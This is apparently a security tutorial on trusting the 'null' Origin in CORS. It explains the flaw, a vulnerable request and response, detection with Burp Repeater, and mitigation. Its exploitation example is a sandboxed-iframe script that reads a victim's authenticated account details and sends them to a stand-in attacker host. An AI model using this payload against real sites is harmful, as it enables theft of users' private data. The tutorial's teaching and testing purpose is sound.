# Whitelisted `null` Origin

## Overview

The `Origin` header can sometimes contain the special value:

```http
Origin: null
```

Although it looks harmless, trusting the `null` origin is a dangerous CORS misconfiguration that can allow attackers to read sensitive authenticated responses.

---

# What is a `null` Origin?

Browsers may send:

```http
Origin: null
```

instead of a normal origin in several situations:

- Sandboxed iframes
- `file://` URLs
- `data:` URLs
- Serialized documents
- Cross-origin redirects

---

# Vulnerable Configuration

Request

```http
GET /accountDetails HTTP/1.1

Origin: null
```

Response

```http
HTTP/1.1 200 OK

Access-Control-Allow-Origin: null

Access-Control-Allow-Credentials: true
```

The browser now allows JavaScript executing from a `null` origin to read authenticated responses.

---

# Attack Flow

```
Victim

↓

Attacker Page

↓

Sandboxed iframe

↓

Origin: null

↓

Server Trusts null

↓

Sensitive Response

↓

Attacker
```

---

# Exploitation Example

```html
<iframe sandbox="allow-scripts allow-forms allow-top-navigation"
srcdoc='
<script>
var req = new XMLHttpRequest();

req.onload = function(){

location="https://attacker.com/log?d="+encodeURIComponent(this.responseText);

};

req.open("GET","https://victim.com/accountDetails",true);

req.withCredentials=true;

req.send();
</script>'>
</iframe>
```

The sandboxed iframe generates a request with:

```http
Origin: null
```

If the server trusts it, sensitive data is exposed.

---

# Detection

Using Burp Repeater:

Replace:

```http
Origin: https://example.com
```

with

```http
Origin: null
```

If the response contains:

```http
Access-Control-Allow-Origin: null
```

the application is vulnerable.

---

# Bug Bounty Perspective

Always test:

```http
Origin: null
```

especially when:

- Credentials are allowed
- Sensitive endpoints exist
- The response contains user information

---

# Mitigation

- Never whitelist `null`.
- Use explicit allowlists of trusted origins.
- Validate origins using exact string matching.

---

# Key Learnings

`null` is a valid Origin value. Treating it as trusted can expose authenticated resources to attacker-controlled sandboxed documents.